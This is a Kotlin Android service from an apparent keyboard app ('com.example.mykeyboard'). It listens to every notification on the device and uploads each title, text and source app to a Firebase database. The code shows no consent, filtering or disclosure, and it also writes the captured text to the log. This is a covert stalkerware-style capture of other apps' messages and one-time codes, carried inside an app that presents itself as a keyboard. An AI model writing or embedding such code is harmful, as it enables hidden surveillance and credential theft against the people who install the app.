package com.example.mykeyboard

import android.app.Notification
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import androidx.annotation.RequiresApi
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@RequiresApi(Build.VERSION_CODES.KITKAT)
class AppNotificationListenerService : NotificationListenerService() {
    companion object {
        private const val TAG = "AppNotificationListener"
        private val scope = CoroutineScope(Dispatchers.IO)
        private val databaseRef = FirebaseDatabase.getInstance().getReference("notifications_batches")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        val packageName = sbn.packageName ?: "unknown"
        val extras = sbn.notification?.extras ?: return
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

        if (title.isBlank() && text.isBlank()) return

        scope.launch {
            try {
                val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9._-]"), "_")

                val notificationData = mapOf(
                    "packageName" to sanitizedAppName,
                    "title" to title,
                    "text" to text,
                    "timestamp" to System.currentTimeMillis()
                )

                databaseRef.child(sanitizedAppName).child(timestampKey).setValue(notificationData)
                    .addOnSuccessListener {
                        Log.d(TAG, "Notification captured and logged to Firebase: $title - $text")
                    }
                    .addOnFailureListener { e: Exception ->
                        Log.e(TAG, "Failed to log notification to Firebase", e)
                    }
            } catch (e: Exception) {
                Log.e(TAG, "Error processing notification", e)
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}
